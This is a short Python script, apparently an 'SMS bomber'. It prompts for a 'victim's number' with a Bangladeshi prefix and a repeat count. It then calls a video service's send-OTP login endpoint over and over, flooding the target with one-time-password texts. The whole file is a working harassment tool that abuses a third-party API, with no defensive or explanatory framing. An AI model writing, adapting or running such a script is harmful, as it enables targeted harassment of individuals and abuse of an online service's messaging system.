import requests
number = str(input("Please inter victim's number:+88"))
api = "https://www.bioscopelive.com/bn/login/send-otp?phone=88"+number+"&operator=bd-otp"
amount = int(input("Enter amount: "))
for i in range(amount):
    requests.get(api)
    print(str(i+1)+"Sms sent")

